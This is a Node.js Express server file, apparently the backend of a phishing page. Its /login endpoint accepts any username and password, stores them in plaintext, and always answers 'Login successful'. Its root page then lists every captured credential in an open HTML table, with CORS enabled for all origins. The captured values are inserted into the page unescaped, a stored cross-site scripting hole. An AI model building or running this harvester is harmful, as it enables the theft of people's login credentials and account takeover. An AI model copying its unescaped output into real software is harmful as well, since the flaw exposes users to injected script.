const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

// Store credentials in memory (for demonstration only)
// In a real application, you would use a proper database
let credentials = [];

// Middleware
app.use(cors());
app.use(express.json());

// Serve a simple HTML page to display credentials
app.get('/', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
      <head>
        <title>Stored Credentials</title>
        <style>
          table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
          }
          th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
          }
          th {
            background-color: #f2f2f2;
          }
          tr:nth-child(even) {
            background-color: #f9f9f9;
          }
          .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Stored Credentials</h1>
          <table>
            <thead>
              <tr>
                <th>Username/Email</th>
                <th>Password</th>
                <th>Timestamp</th>
              </tr>
            </thead>
            <tbody>
              ${credentials.map(cred => `
                <tr>
                  <td>${cred.username}</td>
                  <td>${cred.password}</td>
                  <td>${cred.timestamp}</td>
                </tr>
              `).join('')}
            </tbody>
          </table>
        </div>
      </body>
    </html>
  `;
  res.send(html);
});

// Handle login requests
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Basic validation
  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  // Store the credentials with timestamp
  credentials.push({
    username,
    password,
    timestamp: new Date().toLocaleString()
  });

  // Send success response
  res.json({ message: 'Login successful' });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});